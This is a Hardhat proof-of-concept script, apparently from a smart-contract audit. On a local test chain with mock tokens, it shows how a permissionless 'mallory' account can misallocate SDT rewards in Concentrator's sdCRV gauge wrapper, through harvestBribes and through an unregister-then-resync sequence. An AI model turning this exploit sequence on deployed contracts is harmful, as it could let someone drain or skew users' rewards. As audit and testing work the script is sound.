// H3: ConcentratorSdCrvGaugeWrapper (L3763-L3953) + ConcentratorStakeDAOGaugeWrapper (L490-L762)
//     + MultipleRewardAccumulator / LinearMultipleRewardDistributor / LinearReward, bundle bytecode.
const { hre, ethers, E18, DAY, T0, installAt, deploy, setTime, snapshot, revertTo, tryTx } = require("./lib");

const SDT = "0x73968b9a57c6E53d41345FD57a6E6ae27d6CDB2F";
const LEGACY = "0x2b3e72f568F96d7209E20C8B8f4F2A363ee1E3F6";
const ASDCRV = "0x43E54C2E7b3e294De3A155785F52AB49d87B9922";

async function main() {
  const [owner, alice, mallory, treasury, burner, delegation] = await ethers.getSigners();
  const sdt = await installAt(SDT, "MockERC20");
  const legacy = await installAt(LEGACY, "MockLegacyVault");
  await (await legacy.set(ASDCRV, 1000n * E18, 1000n * E18)).wait();
  const st = await deploy("MockERC20"); // staking token
  const gauge = await deploy("MockGauge", [await st.getAddress()]);
  await (await gauge.addReward(SDT)).wait();
  const locker = await deploy("MockLocker");
  const claimer = await deploy("MockBribeClaimer");
  const w = await deploy("ConcentratorSdCrvGaugeWrapper", [await gauge.getAddress(), await locker.getAddress(), delegation.address, await claimer.getAddress()]);
  const W = await w.getAddress();
  await (await w.initialize(treasury.address, burner.address)).wait();
  console.log(`  active reward tokens after initialize: ${await w.getActiveRewardTokens()} (stakingToken=${await st.getAddress()})`);
  console.log(`  totalSupply=${await w.totalSupply()} balanceOf(asdCRV)=${await w.balanceOf(ASDCRV)}`);
  await (await st.mint(alice.address, 1000n * E18)).wait();
  await (await st.connect(alice).approve(W, ethers.MaxUint256)).wait();
  await (await w.connect(alice).deposit(1000n * E18, alice.address)).wait();
  const bribe = (amt) => [[SDT, 0n, amt, []]];
  let base = await snapshot();

  console.log("== H3.A: harvestBribes (permissionless) calls _notifyReward without _distributePendingReward (L3891) ==");
  for (const control of [false, true]) {
    await setTime(T0);
    await (await w.connect(mallory).harvestBribes(bribe(70n * E18))).wait();
    const rd1 = await w.rewardData(SDT);
    await setTime(T0 + 8n * DAY);
    if (control) await (await w.connect(mallory).checkpoint(mallory.address)).wait();
    else await (await sdt.mint(owner.address, 0n)).wait();
    await setTime(T0 + 8n * DAY + 10n);
    await (await w.connect(mallory).harvestBribes(bribe(70n * E18))).wait();
    await setTime(T0 + 15n * DAY + 100n);
    await (await w.connect(alice)["claim()"]()).wait();
    await (await w.connect(mallory)["claim(address)"](ASDCRV)).wait();
    const a = await sdt.balanceOf(alice.address);
    const b = await sdt.balanceOf(ASDCRV);
    console.log(`    checkpoint-before-2nd-bribe=${control}: rate1=${rd1.rate} | alice=${a} asdCRV=${b} total=${a + b} | SDT left in wrapper=${await sdt.balanceOf(W)}`);
    await revertTo(base);
    base = await snapshot(); // hardhat snapshots are single-use
  }

  console.log("== H3.B: unregisterRewardToken (R3) then syncActiveRewardTokens (R1) re-notifies the custody balance ==");
  {
    await setTime(T0);
    await (await w.connect(mallory).harvestBribes(bribe(70n * E18))).wait();
    await setTime(T0 + 8n * DAY);
    await (await w.connect(mallory).checkpoint(ASDCRV)).wait();
    await (await w.grantRole(await w.REWARD_MANAGER_ROLE(), owner.address)).wait();
    await (await w.unregisterRewardToken(SDT)).wait();
    console.log(`    after unregister: active=${await w.getActiveRewardTokens()} historical=${await w.getHistoricalRewardTokens()} SDT custody=${await sdt.balanceOf(W)}`);
    console.log(`    claimable alice=${await w.claimable(alice.address, SDT)} asdCRV=${await w.claimable(ASDCRV, SDT)}`);
    await (await w.connect(mallory).syncActiveRewardTokens()).wait();
    console.log(`    after mallory syncActiveRewardTokens(): active=${await w.getActiveRewardTokens()} historical=${await w.getHistoricalRewardTokens()}`);
    const rd = await w.rewardData(SDT);
    console.log(`    rewardData(SDT): rate=${rd.rate} queued=${rd.queued} finishAt-lastUpdate=${rd.finishAt - rd.lastUpdate}`);
    await setTime(T0 + 16n * DAY);
    await (await w.connect(mallory).checkpoint(alice.address)).wait();
    const ca = await w.claimable(alice.address, SDT);
    const cb = await w.claimable(ASDCRV, SDT);
    console.log(`    +16d claimable alice=${ca} asdCRV=${cb} sum=${ca + cb} vs custody=${await sdt.balanceOf(W)}`);
    await tryTx("alice claim()", () => w.connect(alice)["claim()"]());
    console.log(`    alice received ${await sdt.balanceOf(alice.address)} SDT`);
    await tryTx("claim(asdCRV)", () => w.connect(mallory)["claim(address)"](ASDCRV));
    await tryTx("claimHistorical(asdCRV,[SDT])", () => w.connect(mallory)["claimHistorical(address,address[])"](ASDCRV, [SDT]));
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
